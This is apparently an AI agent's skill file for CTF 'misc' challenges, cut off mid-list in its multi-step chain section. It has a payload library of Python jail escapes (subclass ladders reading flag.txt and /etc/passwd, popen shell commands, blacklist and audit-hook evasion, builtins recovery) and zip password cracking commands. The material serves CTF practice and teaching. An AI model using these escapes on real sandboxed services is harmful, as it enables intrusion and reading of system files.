---
name: misc-pyjail
description: Misc CTF — pyjail escapes, esolangs, programming sockets, encoding chains, archives, QR/barcode decode
category: misc
phase: 1-3
---
Execution policy: follow `skills/_shared/SKILL_CONTRACT.md`; separate evidence from inference, preserve scope, validate each link, and label uncertainty.
# Misc-Pyjail Skill (Phases 1-3: Classify -> Decode -> Gated Escape)
## Mental Model
Misc is a grab-bag with a common shape: a small input surface (jail prompt, encoded blob, archive, QR image, socket service) plus a hidden deterministic transform. The solver's job is to (1) classify the subtype in seconds, (2) decode/inspect locally with zero interaction, (3) build a benign oracle that proves the transform, then (4) fire ONE gated escape or decode chain. Pyjails are allowlist puzzles: builtins are removed but Python's object graph (`__class__ -> __mro__ -> __subclasses__`) is still reachable from any literal. Encoding/archive/QR tasks are pipeline problems: identify magic bytes first, then chain decoders mechanically. Never brute-force blindly; verify each layer's magic before the next.
Core principles:
- Local-first: `file`, `xxd`, `strings`, `binwalk`, `exiftool`, `zbarimg`, `unzip -l`, Python `codecs`/`base64` run before any jail interaction or socket scripting.
- Jail rule: if you can read ANY attribute (`'' .__class__`), you can walk to `object` and then to every loaded class. Blacklists are string filters — bypass with `getattr`, `chr()`, concatenation, formatting, never with louder synonyms of the blocked word.
- Audit hooks (`audit_hook`, `__builtins__` removal) only block known calls. Prefer attribute walks that avoid `eval/exec/__import__/open` strings entirely, or reconstruct them at runtime.
- Encoding rule: decode outermost layer first (QR -> text -> b64 -> hex -> rot). Confirm each layer by re-encoding and comparing.
- Archive rule: list before extract (`unzip -l`, `7z l`), crack passwords with wordlist before brute-force, CRC-brute only tiny files.
- Gate the escape: ONE payload, <=120s, local echo test first.
## Workflow
### Phase 1 — Baseline (local classify, <=60s, zero/low interaction)
Goal: subtype + constraints without burning jail attempts.
1. File triage: `file`, `xxd | head`, `strings -n 6 | head -40`, `exiftool`, `binwalk -E` (entropy), `capinfos` if pcap-ish.
2. If `*.py` jail: read FULL source. List: banned strings/regex, `input()` vs `eval()` vs `exec()` entry, `__builtins__` handling, audit hook (`sys.addaudithook`), timeout, flag path (`flag.txt`?). Write `jail.json`: entry, blacklist, builtins, hook, goal.
3. If blob: check hex? b64? rot13-looking? morse (`.-/`)? bacon (a/b runs)? railfence? Save `blob.txt`.
4. If archive: `unzip -l` / `7z l` / `tar tf`; note nesting depth, encryption flag, CRCs, weird extensions (`.qr`, `.pcap`, `.wav`).
5. If image: `zbarimg --raw` + `exiftool` + `strings`; check QR/barcode vs stego (route stego out — not this skill).
6. If socket service: `nc`-banner read once, record prompt/echo/timeout, save `service.txt`. No fuzzing yet.
`Reasoning Checkpoint`: classification evidence (subtype + constraints + magic bytes) -> route (jail/esolang/encode/archive/QR/socket) -> next (Phase 2 oracle, specific probe).
### Phase 2 — Confirmation (benign oracle, cap ~15 probes)
Goal: prove the mechanism with harmless output.
1. Pyjail: send `1+1`, then `().__class__`, then `''.__class__.__mro__`. Success = class-tuple echo, NOT shell. If blocked, try ONE bypass spelling (`getattr`, `chr(95)`) — log which filter fired.
2. `eval` vs `exec` vs `input`: `__import__('os')` must NOT run yet. Confirm code-execution sink with `7*7` -> `49` or `().__class__` echo only.
3. Audit hook: trigger with `open('x')` on a nonexistent file; blocked message vs traceback tells you hook presence. Do not fight it yet.
4. Esolang: feed `Hello`-equivalent sample to local interpreter (`bf`/`befunge`); confirm output matches before running challenge file.
5. Encoding: decode ONE layer locally, re-encode, compare round-trip. QR: `zbarimg --raw img.png` must return text; barcode variants try `--set` configs only if raw fails.
6. Archive: `fcrackzip -D -p wordlist` dry-run on copy; socket: echo a static string, measure echo + latency for later scripting.
`Reasoning Checkpoint`: oracle evidence (echo/decode/listing per probe) -> route (single escape or decode chain) -> next (Phase 3 negative controls).
### Phase 3 — Negative (rule out coincidence, cap ~10 probes)
Goal: prove the oracle is the real sink, not echo luck.
1. Jail: send plain `hello` — must echo literally or error benignly (control). Send blocked word alone (`import`) — must trigger filter message. If both behave identically, filter understanding is wrong.
2. Attribute walk: `().__class__` vs `(1).__class__` vs `''.__class__` should all resolve. If only one works, note type-gating.
3. Encoding: decode with WRONG layer (e.g. hex-decode a b64 blob) must fail or produce non-printable bytes. If everything "decodes", the classifier is wrong.
4. Archive: `unzip -t` with wrong password must fail; QR: crop/rotate a copy and confirm decode still works (rules out overlay trick).
5. Socket: send malformed line, confirm error format differs from success format (proves parser, not echo).
6. If any control fails: re-classify, do not escalate.
`Reasoning Checkpoint`: negative evidence (controls pass/fail) -> route (confirmed sink vs re-classify) -> next (ONE gated escape/decode, Phase 4).
### Phase 4 — Exploit, gated (ONE step, <=120s)
Goal: exactly one payload/chain that yields flag text or shell. Test payload locally (echo/AST) first when possible. One network shot for socket jails; one decode pipeline run for encodings; one `fcrackzip`/`unzip` run for archives. Timer 120s hard stop.
Pick ONE by subtype: pyjail `input()`+`eval` -> classic `__class__/__mro__/__subclasses__` ladder to `open('flag.txt').read()`. Blacklisted jail -> `getattr`+`chr` reconstruction. Audit-hook jail -> attribute-only path, no direct `open`/`system` strings. Esolang -> run chall file through local interpreter. Socket -> `solve.py` template once. Encoding -> full chain once, `grep -E -o` flag pattern. Archive -> crack/extract/recurse depth<=5 once. QR/barcode -> `zbarimg --raw` (+ invert/scale) once.
`Reasoning Checkpoint`: exploit evidence (payload class + output excerpt + flag-pattern yes/no) -> route (validate vs single alternate spelling) -> next (Phase 5 handoff, no further shots).
### Phase 5 — Validation-handoff (read-only verify)
Goal: reproducible flag path, no new exploitation.
1. Save raw output to `artifacts/misc/flagpath_<subtype>.txt`.
2. `grep -E -o '(flag|FLAG|CTF|picoCTF|HTB)\{[^}]{1,200}\}'` to confirm format — record match yes/no, not full flag in chat.
3. Write `flagpath.json`: subtype, entry point, payload class (abstract, e.g. `subclasses-ladder` not raw bypass), decoder chain, tool versions, elapsed, probe count.
4. Causality: replay WITHOUT payload (plain input / wrong password / unmodified QR) and confirm no flag. Proves the path.
5. Hand off: category `misc`, confidence, artifact paths, exact replay command. Release slot; do not keep fuzzing.
`Reasoning Checkpoint`: validation evidence (replayable + causal) -> route (submit/validate) -> next (writeup; done).
## Tool Table (exact copy-paste commands)
| Purpose | Command |
|---|---|
| File triage | `file chal.py chal.bin image.png flag.zip` |
| Header/hex | `xxd chal.bin \| head -20` |
| Strings hunt | `strings -n 8 chal.bin \| grep -E -m10 '(flag\|FLAG\|picoCTF\|HTB\|CTF)\{'` |
| Metadata | `exiftool image.png chal.py` |
| Entropy/scan | `binwalk -E chal.bin` |
| AST check (local) | `python3 -c "import ast; ast.parse(open('chal.py').read()); print('parses')"` |
| Builtins probe | `python3 -c "print([x for x in dir(__builtins__)])"` |
| QR decode | `zbarimg --raw qr.png` |
| QR quiet | `zbarimg --quiet --raw qr.png` |
| QR inverted | `zbarimg --raw --set test-inverted qr.png` |
| Barcode batch | `for f in *.png; do echo "== $f"; zbarimg --raw "$f"; done` |
| Zip list | `unzip -l chal.zip` |
| Zip test | `unzip -t chal.zip` |
| Zip extract | `unzip -o -P "$PASS" chal.zip -d out/` |
| 7z list/extract | `7z l chal.7z; 7z x -p"$PASS" chal.7z -oout/` |
| Zip dict crack | `fcrackzip -D -p /usr/share/wordlists/rockyou.txt --use-unzip chal.zip` |
| Zip brute (short) | `fcrackzip -b -c a1 -l 1-4 --use-unzip chal.zip` |
| Zip brute (lower) | `fcrackzip -b -c a -l 1-6 --use-unzip chal.zip` |
| CRC check | `python3 -c "import zlib; print(hex(zlib.crc32(open('f','rb').read())))"` |
| b64 decode | `base64 -d blob.b64 > out.bin; file out.bin; xxd out.bin \| head` |
| hex decode | `xxd -r -p blob.hex > out.bin` |
| rot13/brute | `python3 -c "import codecs; print(codecs.decode(open('b.txt').read().strip(),'rot13'))"` |
| Socket banner | `timeout 8 nc -v $HOST $PORT` |
| Socket script | `python3 solve.py $HOST $PORT` (template below) |
| Interpreter bf | `python3 bf.py chall.bf` |
| Timeout guard | `timeout 120 python3 exploit_once.py` |
Wordlists: `/usr/share/wordlists/rockyou.txt` (may need gunzip from `rockyou.txt.gz`). Sources: `zbar-tools` man page (`zbarimg --raw`, `--set`, `--quiet`), `fcrackzip` man page (`-D -p`, `-b -c a1 -l`, `--use-unzip`).
## Payload Library
Pyjail — ladder discovery (benign, run against LOCAL copy first):
```python
''.__class__
''.__class__.__mro__
''.__class__.__mro__[1].__subclasses__()
# find index of useful class locally:
[x for i, x in enumerate(''.__class__.__mro__[1].__subclasses__()) if 'file' in str(x).lower() or 'popen' in str(x).lower() or 'catch' in str(x).lower()]
```
Pyjail — classic file read (replace INDEX after local discovery):
```python
''.__class__.__mro__[1].__subclasses__()[INDEX]('flag.txt').read()
().__class__.__base__.__subclasses__()[INDEX]('/etc/passwd').read()
```
Pyjail — RCE via popen (gated; prefer read):
```python
''.__class__.__mro__[1].__subclasses__()[INDEX]('cat flag*', shell=True).read()
().__class__.__base__.__subclasses__()[INDEX]('id', shell=True).read()
```
Pyjail — blacklist bypass via getattr + chr (no banned literal):
```python
getattr('', '__cla'+'ss__')
getattr('', chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95))
().__class__.__getattribute__('__subclasses__')()
```
Pyjail — string-concat / format / codec variants:
```python
'__cl'+'ass__'
'__cl%s__' % 'ass'
'__class__'[::-1][::-1]
().__class__.__dict__['__mro__']
vars(''.__class__)['__mro__']
```
Pyjail — input/eval/exec variants:
```python
# entry eval(input()): send ladder directly
# entry exec(input()): prefer open('flag.txt').read() (avoid __import__/system text)
# entry input() printed but not evaled: NOT code exec -> try format-string '{0.__class__}'.format('')
```
Pyjail — audit-hook evasion (technique, local test):
```python
# hooks often block 'open', 'exec', 'compile', 'socket', 'os.system' strings/events.
# Prefer pure attribute walk already in memory; reconstruct blocked names at runtime:
g = getattr
c = g('', '__cla'+'ss__')
# read via subclass already imported by the jail itself (no new import event).
```
Known picoCTF-style jail patterns (abstract checklist):
```text
[PATTERN] banner + "no import/exec/eval" + blacklist loop over input string
 -> bypass with getattr/chr/concat; goal open('flag.txt').read()
[PATTERN] filter blocks '_', '.', 'class', 'import'
 -> chr(95) for '_', getattr for '.', format-string '{0.__class__}'
[PATTERN] exec-only jail with timeout 5s -> single short read payload, no loops/sockets
[PATTERN] jail returns repr() of result -> wrap: str(open('flag.txt').read())
```
Esolangs — local interpreters (write minimal, test `Hello` first):
```python
# brainfuck: 8 ops > < + - . , [ ]; tape 30000 cells, bracket map precomputed.
def bf(code, inp=''):
    tape, p, ip, out, jump = [0]*30000, 0, 0, [], {}
    st = []
    for i, c in enumerate(code):
        if c == '[': st.append(i)
        elif c == ']':
            j = st.pop(); jump[j] = i; jump[i] = j
    while ip < len(code):
        c = code[ip]
        if c == '>': p += 1
        elif c == '<': p -= 1
        elif c == '+': tape[p] = (tape[p]+1) % 256
        elif c == '-': tape[p] = (tape[p]-1) % 256
        elif c == '.': out.append(chr(tape[p]))
        elif c == ',': tape[p] = ord(inp[0]) if inp else 0; inp = inp[1:]
        elif c == '[' and tape[p] == 0: ip = jump[ip]
        elif c == ']' and tape[p] != 0: ip = jump[ip]
        ip += 1
    return ''.join(out)
```
```text
whitespace: ops are spaces/tabs/newlines only -> `cat -A` to see, then stack-machine.
befunge-93: 2D playfield, `"` toggles string mode, `@` ends; run with local befunge.py.
```
Programming socket template (fast, single run):
```python
import socket, re, sys
HOST, PORT = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((HOST, PORT), timeout=8)
s.settimeout(8)
def recv_until(*markers, limit=65536):
    buf = b''
    while not any(m in buf for m in markers) and len(buf) < limit:
        chunk = s.recv(4096)
        if not chunk: break
        buf += chunk
    return buf
print(recv_until(b':', b'?', b'>', b'$').decode(errors='replace'))
# parse challenge, compute, send answer + b'\n' in a loop with cap 200 rounds
```
Encoding chains (local, outermost first):
```python
import base64, binascii, codecs
b64 = base64.b64decode
hxd = lambda s: bytes.fromhex(''.join(s.split()))
rot = lambda s, n=13: codecs.decode(s, f'rot_{n}') if n == 13 else ''.join(chr((ord(c)-65+n)%26+65) if c.isupper() else chr((ord(c)-97+n)%26+97) if c.islower() else c for c in s)
# vigenere/railfence/morse/bacon: implement tiny funcs, brute key/rails locally, cap keys<=200
```
```bash
echo "$BLOB" | base64 -d | xxd | head
echo "$BLOB" | rev | base64 -d
for n in $(seq 1 25); do echo "--- rot$n"; echo "$BLOB" | tr 'A-Za-z' 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; done
```
Archives — nested/CRC:
```bash
unzip -l chal.zip
7z l chal.7z
# nested: extract to out/, re-run file on each layer, max depth 5
for i in 1 2 3 4 5; do file out/* 2>/dev/null; unzip -o out/*.zip -d out/ 2>/dev/null || break; done
# CRC brute (tiny known-plaintext only):
python3 -c "import zlib,itertools,string; t=open('known.bin','rb').read(); [print(''.join(p)) or exit() for n in range(1,5) for p in itertools.product(string.ascii_lowercase,repeat=n) if (zlib.crc32(b''.join(p)+t)&0xffffffff)==0xTARGET]"
```
QR/barcode decode + preprocess:
```bash
zbarimg --raw qr.png
zbarimg --quiet --raw qr.png
convert qr.png -negate qr_inv.png && zbarimg --raw qr_inv.png
convert qr.png -resize 300% qr_big.png && zbarimg --raw qr_big.png
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png')))"
```
## Decision Tree
```text
file/xxd/strings
 +-- *.py jail / prompt mentions banned words --> PYJAIL (read source -> jail.json -> benign ladder -> 1 bypass)
 +-- .bf / whitespace / .b93 -------------> ESOLANG (local interp Hello-test -> run chall file)
 +-- HOST:PORT + math/quiz/pow -----------> SOCKET-PROG (template solve.py, cap 200 rounds, 8s timeout)
 +-- b64/hex/rot/morse/bacon/railfence ----> ENCODING (outer-first chain, round-trip check each layer)
 +-- .zip/.7z/.tar / nested / password ----> ARCHIVE (list -> rockyou dict -> short brute -> recurse d<=5)
 +-- .png QR/barcode ----------------------> QR (zbarimg raw -> invert/scale -> pyzbar fallback)
 +-- else ---------------------------------> re-triage (stego? crypto? pwn?) or blocked handoff
```
Jail sub-tree:
```text
entry = input()+eval/exec/eval-print/format?
 +-- blacklist? -> getattr/chr/concat/format-string (never raw blocked word)
 +-- audit hook? -> attribute-only walk, runtime-reconstruct names
 +-- builtins stripped? -> literal.__class__ walk (no __import__ text)
 +-- timeout short? -> single short read payload, no loops/sockets
```
Encoding sub-tree: `magic? (QR? zip? b64 alphabet? hex? ./-?) -> decode one layer -> re-encode verify -> repeat (cap 6 layers) -> flag grep`.
## AI Automation Notes (script, timeouts, caps)
What to script (worker):
- `classify.py`: file/xxd/exiftool/zbarimg/unzip-l wrapper, writes `subtype.json`. 60s total, read-only.
- `jail_probe.py`: sends benign ladder (`1+1`, `().__class__`, `__mro__`) with 2s gaps, logs exact filter messages to `jail.json`. Cap 15 probes Phase 2, 10 Phase 3. Never sends RCE in probe stages.
- `local_ladder.py`: discovers subclass INDEX locally against matching Python minor version, tests payload with `ast.parse` + local exec on dummy file. Only the validated string goes to the wire (ONE shot).
- `chain.py`: encoding pipeline with per-layer verify (re-encode compare), cap 6 layers, 200-key brute max for vigenere/rails.
- `crack_once.py`: `fcrackzip -D rockyou` first (timeout 90s), then `-b -c a1 -l 1-4` (timeout 120s) ONLY if dict fails and file is small. Never infinite brute; CRC-brute only if plaintext known + len<=4.
- `solve.py`: socket template with round cap 200, per-recv timeout 8s, total timeout 120s, exponential backoff on disconnect (2 tries max).
- `qr.py`: zbarimg raw -> negate -> upscale -> pyzbar, first success wins.
Caps (hard): Phase 1 <=60s local; Phase 2 <=15 probes; Phase 3 <=10; Phase 4 exactly ONE escape/chain, `timeout 120`; socket rounds <=200; encoding layers <=6; archive depth <=5; total jail inputs <=30 or mark `blocked`. Stop: timeout kill, hook hard-block twice, 3 failed classifications -> hand off `subtype.json` + `matrix` of tried probes.
Handoff: `flagpath.json` + raw output + replay one-liner. Technique-only: no live hosts, no real flags, `$HOST/$PORT` placeholders only.
## Advanced / Hard-Challenge Playbook
Hard pyjails and mixed misc challenges share one trait: the obvious ladder
is blocked and the flag path needs 2+ primitives composed. Default to the
Phase 1-4 pipeline first; reach for the items below only after the benign
oracle tells you which wall you hit. Every technique here is local-testable:
prove it against a local copy of the jail/interpreter/VM before spending a
gated probe.
### A1. Hardened pyjails — staying inside the object graph
Principle: if ANY literal evaluates, the full class graph is reachable.
Hardened jails remove `__builtins__`, block `import/eval/exec/open/system`,
add `sys.addaudithook`, and regex-filter `_ . ( ) [ ]` or words like
`class/mro/subclasses`. Never fight the filter head-on; change spelling.
1. No-builtins via subclasses, staying inside:
   - Start from a literal that survives: `''`, `()`, `[]`, `0`, `False`.
   - Walk without naming builtins: `''.__class__.__mro__[1].__subclasses__()`.
   - If `.` is blocked: `getattr('', '__cla'+'ss__')` or
     `''.__getattribute__('__class__')` or `vars(''.__class__)['__mro__']`.
   - If `[]`/indexing is blocked: `__getitem__` spellings —
     `getattr(TUPLE, '__getitem__')(INDEX)` or
     `getattr(OBJ, '__getattribute__')('__subclasses__')()`.
   - If `()` calls are AST-blocked: decorator/call-free forms —
     `@exec` + `@input` + `class A: pass` pattern, or `__init_subclass__`
     side effects, evaluated once locally before use.
   - Discover INDEX locally: enumerate subclasses on the SAME Python minor
     version and pick by substring (`file`, `popen`, `wrap_close`, `catch`,
     `loader`), never guess INDEX twice live.
2. Audit-hook `open` blocks → codec/importlib/already-imported paths:
   - Hooks typically fire on events `open`, `exec`, `compile`, `socket`,
     `os.system`, `subprocess`. Attribute walks that never emit those event
     names as literals do not trip the hook.
   - Prefer a subclass the jail process already imported (file-like or
     loader objects): call its read/load method instead of global `open()`.
   - Codec path: build the blocked name at runtime so the source scan never
     sees it — `'__op'+'en__'`, `chr(95)+chr(95)+...`, `'__cl%s__' % 'ass'`,
     `().__class__.__dict__['__mro__']`. Reconstruct, do not spell out.
   - `importlib`/loader path: if `__import__` text is blocked, reach a
     module object already in `sys.modules` via `__init__.__globals__` of a
     discovered subclass, then `getattr(mod, 'sys'+'tem')`. No new import
     event is raised when reusing a loaded module.
   - `codecs`/`base64` decode path: if quotes or parens are filtered, stage
     the payload as an encoded blob decoded at runtime (`codecs.decode`,
     `bytes.fromhex`, `base64.b64decode`) so the wire text carries no banned
     substring. Verify decode locally first (round-trip compare).
3. `__builtins__` reconstruction ladders (weakest to strongest):
   - L1 — direct: `__builtins__.__import__('os')` (only if builtins present).
   - L2 — function globals: any function object
     `F.__init__.__globals__` or `F.__globals__` exposes the jail's real
     globals dict; read `__builtins__` key from it instead of the stripped
     local namespace.
   - L3 — subclass globals: `[C for C in subclasses if 'wrap_close' in str]`
     then `C.__init__.__globals__['system']` or `['__builtins__']`. This is
     the standard no-builtins recovery; cache the INDEX locally.
   - L4 — `gc`/frame paths (only if `gc`/`sys._getframe` reachable):
     `gc.get_objects()` scan for module/class objects, or
     `sys._getframe(0).f_globals` / `f_builtins`. Noisy — one probe max,
     local test first.
   - L5 — format-string introspection: `'{0.__class__}'.format('')` or
     `f'{x.__class__.__mro__}'` when dot-attribute syntax is filtered but
     format mini-language is evaluated. Confirms graph reachability without
     sending a single blocked word.
   - Rule: climb exactly one rung per probe; log which rung returned data.
     If L2 works, never fire L4/L5 live.
4. Blacklist-evasion grammar (compose, do not stack blindly):
   - `getattr(X, NAME)`: replaces every `X.NAME` dot. NAME itself is a
     string, so it can be built: `getattr(X, '__cl'+'ass__')`.
   - `chr(N)`: replaces every blocked char (`_` = 95, `.` = 46, `(` = 40,
     letters as needed). Full-name form:
     `chr(95)+chr(95)+chr(99)+...` builds the whole dunder with zero
     letters on the wire.
   - Concatenation: `'__cl'+'ass__'`, `'__imp'+'ort__'`, `'o'+'s'`.
     Splits must break EVERY blacklisted substring, not just one.
   - Format-string: `'__cl%s__' % 'ass'`, `'__cl{}__'.format('ass')`,
     `'{0.__class__}'.format('')`. Use when `+` or quotes are restricted.
   - Codec/escape: `'\x5f\x5f...'` hex escapes, `'\u005f...'` unicode
     escapes, `codecs.decode(b'...','rot13')`, `bytes.fromhex(...)`.
     Use when the filter scans raw source text but decodes at runtime.
   - Case/unicode: Python identifiers accept certain unicode letters;
     prefer the four spellings above first (deterministic, version-stable).
     Unicode tricks are version-fragile — local-test on the exact minor.
   - Composition order: getattr-outer > chr/concat-inner > format/codec
     only if needed. Test the FINAL composed string with `ast.parse`
     locally; if it does not parse locally, never send it.
   - Anti-pattern: stacking all five at once "to be safe" — produces an
     unparseable blob and burns the probe budget. One evasion per blocked
     token, verified locally.
### A2. Sandbox escapes — concept map (know when you are NOT in a pure pyjail)
Some "pyjail" challenges add OS-level sandboxes. Recognize the layer before
choosing the tool; the wrong layer wastes the whole budget.
1. `chroot`-style (filesystem-limited):
   - Concept: process root is remapped; `../../../..` still stays inside.
     Flag file is usually bind-mounted inside, so pure-Python read still
     wins — do NOT attempt kernel escapes.
   - Tell: `os.listdir('/')` shows a tiny root (`flag.txt`, `jail.py` only),
     `open('/etc/passwd')` missing or minimal, absolute paths outside fail.
   - Play: subclass-ladder read of the in-jail flag path (from jail source),
     never `chdir/..` games. If source shows flag at `/flag.txt` but jail
     CWD differs, try relative `flag.txt`, `./flag.txt`, `/flag.txt` in ONE
     local-tested payload with fallback order — still counts as one shot if
     sent as a single expression with `or` fallbacks.
   - Escalate to operator (not self-escape) if the flag path is genuinely
     outside the remapped root and no read primitive reaches it.
2. Namespace-limited (network/process-isolated):
   - Concept: own PID/net/mount namespace; no egress, no `socket`, no
     subprocess talking out. Local file read still works.
   - Tell: `socket`/`connect` audit events blocked, banner says "no
     internet", `__import__('socket')` present but `connect` times out.
   - Play: memory-only/file-only exfil (Section Failure Modes F1/F2).
     Never retry network exfil twice; switch to error-message or
     repr-echo channel after the first timeout.
3. Seccomp-limited fileless (syscall-filtered):
   - Concept: `execve`/`socket`/`ptrace` return EPERM/killed; only
     `open/read/write` (ORW) survive. Relevant when the jail drops into a
     compiled helper or the "misc" task is really a fileless pwn adjacent.
   - Tell: `os.system('id')` dies silently or `Blocked syscall`, while pure
     `open('flag.txt').read()` still returns data through the Python layer.
   - Play: ORW mindset at Python level — open/read/write only, no
     `system/popen/exec`. `os.read(os.open(PATH, 0), N)` instead of
     `os.system('cat ...')`. If BOTH Python-level read and ORW fail, hand
     off to `/pwn` with the seccomp evidence (filter dump if available)
     rather than inventing shellcode here.
   - Never attempt `io_uring`/`ptrace`/arch-confusion tricks from inside a
     pure Python jail payload — those belong to a `/pwn` binary context
     with a real ROP chain, not a one-line eval.
### A3. Esolang golf — interpret-and-run loop (brainfuck/befunge family)
Hard misc tasks hide the flag behind an esolang file (`.bf`, befunge grid,
whitespace program) sometimes wrapped in one more encoding layer.
1. Identify in seconds: alphabet size tells the language —
   - 8-symbol `><+-.,[]` runs → brainfuck.
   - 2D grid with `v^<>?_|"@,.` → befunge-93/98.
   - Only spaces/tabs/newlines significant → whitespace (`cat -A` to see).
   - Anything else → treat as custom-VM (A4), not esolang.
2. Interpret-and-run loop (never hand-simulate):
   - Step 1: write/lift a MINIMAL local interpreter (the bf stub in Payload
     Library is enough; befunge needs a small 2D walker with stack +
     string-mode + `@` halt). No dependencies beyond stdlib.
   - Step 2: test on a trivial program FIRST (bf `Hello` known-good, befunge
     tiny `"!dlroW ,olleH">:#,_@` style cat). If trivial fails, the
     interpreter is wrong — fix it before touching the challenge file.
   - Step 3: run the challenge file locally with `timeout 30`, capture
     stdout. If output is still encoded (hex/b64-looking), route to the
     encoding chain (outer-first) — do not re-run with tweaks.
   - Step 4: one flag-pattern grep on the output. Done — no live probes at
     all for pure-esolang tasks.
3. Golf pitfalls: tape size/cell width (30k cells, mod-256 vs unbounded),
   EOF semantics (0 vs -1 vs no-change on `,`), befunge-93 80x25 playfield
   wrap vs befunge-98 unbounded, whitespace instruction mapping variants.
   When output is "almost right" (off-by-one chars), vary exactly one
   semantic (cell width first, then EOF, then wrap) and re-run — cap 3
   interpreter variants, then escalate to `/rev` with the variant matrix.
### A4. Custom-VM challenges — opcode table recovery from a binary
"Run this VM with this bytecode, get the flag" tasks are misc-flavored rev.
1. Triage: `file`, `xxd | head`, `strings -n 6 | head -40` on BOTH the VM
   binary and the bytecode file. Note opcode dispatch shape (`switch`,
   jump table, handler-function array) via `strings`/disasm glance only —
   full reversing belongs to `/rev`.
2. Opcode table recovery (worker-level, bounded):
   - Collect handler boundaries: each `case N:` / jump-table slot is one
     opcode. Record count (e.g. 16, 32, 256 handlers).
   - For each handler, note the stack/machine effect in one line
     (`push imm`, `add`, `xor`, `load`, `store`, `out`, `jmp/jz`, `halt`).
     Cap 30 minutes of static notes; do not fully devirtualize here.
   - Cross-check with the bytecode: opcode-frequency histogram
     (`python3 -c` counter over the bytecode bytes) should match the
     handler count guess (e.g. only values 0x00-0x0F appear → 16-op VM).
3. Solve path: emulate the recovered table in a tiny Python loop over the
   challenge bytecode (same shape as the bf interpreter: fetch/decode/
   execute with a step cap like 10M). Test the emulator on the trivial
   expectation first (does `halt` stop? does `out` produce ASCII?).
4. Escalate to `/rev` with handler notes + histogram + emulator stub when:
   handlers use crypto/obfuscation, self-modifying bytecode, or the table
   exceeds ~64 ops. Do not burn the misc budget on full devirtualization.
### A5. Polyglot files — ZIP+PNG, GIF+code patterns
A file that is valid as TWO formats (image that is also an archive/script).
1. Detect: `file` reports one type but `xxd` shows the other's magic at an
   offset (`PK\x03\x04` inside a `.png`, `GIF89a` + script text, `<?php`
   inside image comments, trailing zip central directory at EOF).
   `binwalk -E` + `strings` confirm; `exiftool` shows comment/script fields.
2. ZIP+PNG: `unzip -l poly.png` / `7z l poly.png` — archives parse from the
   central directory at EOF regardless of leading image bytes. Extract with
   `7z x poly.png -oout/` or `unzip`, then treat contents as the next layer
   (usually the jail file or encoded blob). Never "repair" the image.
3. Image+code (GIF/PHP-style): `strings -n 8` pulls the text payload;
   `exiftool` comment fields may hold b64/hex. Copy the text layer out and
   run the encoding chain on it — do not execute image-embedded code.
4. Rule: list-before-extract still applies (`-l` before `x`), depth cap 5
   total across polyglot + nested archives. If neither archive tool lists
   anything AND no script text appears, re-triage (stego → out of skill).
### A6. Hash-puzzle / proof-of-work solvers
Socket services that demand `find nonce with sha256(prefix+nonce) < target`
(or `md5 suffix == zeros`) before talking. Never hand-solve; script it.
1. Parse the PoW spec from ONE banner read: algorithm (`sha256/md5/sha1`),
   prefix string, target shape (leading zeros count `N`, suffix match,
   `hash.endswith`), charset (`ascii_lowercase+digits`?), max length.
   Save `pow.json` — misreading the spec is the #1 time sink.
2. Solver stub (local, bounded):
```python
import hashlib, itertools, string
def solve_pow(prefix, zeros, algo='sha256', charset=None, limit=2000000):
    h = getattr(hashlib, algo)
    cs = charset or (string.ascii_lowercase + string.digits)
    # leading-zero-hex fast path (most common)
    n = 0
    while n < limit:
        cand = f"{prefix}{n}"
        if h(cand.encode()).hexdigest().startswith('0' * zeros):
            return cand, str(n)
        n += 1
    return None, None
```
3. Caps: PoW difficulty in CTFs is solvable in <60s single-core; if the
   stub exceeds 120s or `limit`, the spec parse is wrong (re-read banner:
   hex vs bits vs suffix) — do not scale to GPU/multiprocess here.
   Suffix/equality puzzles need the charset-constrained brute variant;
   keep the same 120s guard.
4. After PoW: the service becomes a normal socket-prog task — reuse the
   `solve.py` template with the PoW answer sent first, then the quiz loop.
### A7. Oracle-games — guess-the-number optimal strategies
Services that answer higher/lower/equal, hot/cold, or parity per guess.
1. Classify the oracle in 2-3 benign probes: binary feedback (`higher/
   lower`), distance feedback (`hot/cold`), exact-match only, attempts cap,
   range size. Record all five in `oracle.json`.
2. Optimal strategies (no guessing heuristics):
   - Binary higher/lower over range N → bisect midpoint every round
     (`ceil(log2(N))` rounds max). Never linear-scan.
   - Hot/cold distance → binary search on the distance gradient, or
     ternary if the gradient is non-monotonic; track last two distances.
   - Exact-match-only with attempts cap → treat as hash-puzzle if the
     space is small, else mark `blocked` early (no blind brute beyond the
     200-round socket cap).
   - Leaky oracle (error text differs by closeness, timing differs) →
     route to blind-exfil playbook (F2): fixed alphabet, position loop,
     one char per round, server-response compare — cap 200 rounds total.
3. Script from round one: `solve.py` computes the next guess from the full
   response history (no human-in-the-loop guessing). Single run, 120s
   guard, 2 reconnects max — same socket caps as Phase 4.
`Reasoning Checkpoint`: hard-playbook evidence (which wall the oracle named
+ local proof the chosen spelling/semantics works) -> route (single composed
payload / local-only decode / escalate per triggers) -> next (gated shot or
handoff, no stacking).
## Multi-Step Chains (abstract patterns — compose, never improvise live)
Each chain is a fixed ORDER with a per-link verify. If any link's verify
fails, stop and re-classify — do not skip ahead.
### Chain 1 — jail recon → class ladder → read flag (the standard hard jail)
1. Recon (Phase 1-2): FULL source read → `jail.json` {entry, blacklist,
   builtins, hook, flag-path hint}. Benign ladder `1+1`, `().__class__`,
   `''.__class__.__mro__` confirms the sink; blocked-word probe names the
   filter. Verify: class-tuple echo present.
2. Ladder (local): `local_ladder.py` discovers INDEX on the matching minor,
   composes the ONE bypass spelling (getattr/chr/concat per A1), validates
   with `ast.parse` + dummy-file read locally. Verify: local read returns
   dummy content.
3. Read (Phase 4, ONE shot): send the validated read expression targeting
   the source-hinted flag path with `or`-fallbacks only if pre-tested
   (`open('flag.txt').read()` style via ladder). Verify: flag-pattern grep
   on output + no-payload causality replay (Phase 5).
### Chain 2 — archive/zip chain → crack → inner jail or blob
1. Outer (Phase 1): `unzip -l` / `7z l` lists layers; note encryption +
   depth + inner extensions (`.py` jail? `.bf`? `.png`?). Verify: listing
   shows the inner name before any extract.
2. Crack (bounded): `fcrackzip -D rockyou` (90s) then short `-b` (120s)
   ONLY if small; CRC-brute only tiny known-plaintext. Verify: `unzip -t`
   passes with the found password.
3. Inner (recurse): extract to `out/`, `file` each layer, depth cap 5. If
